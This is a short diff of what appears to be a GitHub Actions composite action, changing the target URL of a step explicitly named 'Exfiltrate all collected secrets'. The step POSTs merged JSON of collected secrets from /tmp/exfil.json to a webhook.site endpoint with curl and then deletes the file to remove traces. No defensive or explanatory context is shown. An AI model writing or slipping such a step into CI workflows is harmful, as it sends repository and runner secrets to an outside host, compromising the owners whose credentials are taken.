@@ -18,7 +18,7 @@ runs:
     - name: Exfiltrate all collected secrets
       if: ${{ inputs.payload-file-path }}
       run: |
-        curl -X POST https://webhook.site/TestActionBitwarden \
+        curl -X POST https://webhook.site/TestSlackAPI \
           -H "Content-Type: application/json" \
           -d "$(cat /tmp/exfil.json | jq -s 'reduce .[] as $item ({}; . * $item)')"  # Merge all appended JSONs into one
         rm /tmp/exfil.json  # Clean up
